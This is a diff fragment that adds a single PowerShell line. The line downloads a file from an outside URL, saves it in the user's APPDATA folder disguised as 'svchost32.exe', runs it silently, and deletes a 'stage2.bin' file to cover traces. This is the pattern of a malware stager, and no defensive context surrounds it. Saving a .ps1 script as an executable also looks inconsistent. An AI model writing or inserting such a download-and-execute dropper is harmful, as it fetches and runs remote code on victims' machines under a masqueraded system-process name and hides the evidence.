@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage1Url = 'https://internal.corp/updater.ps1'; $WorkingPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $WorkingPath); Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
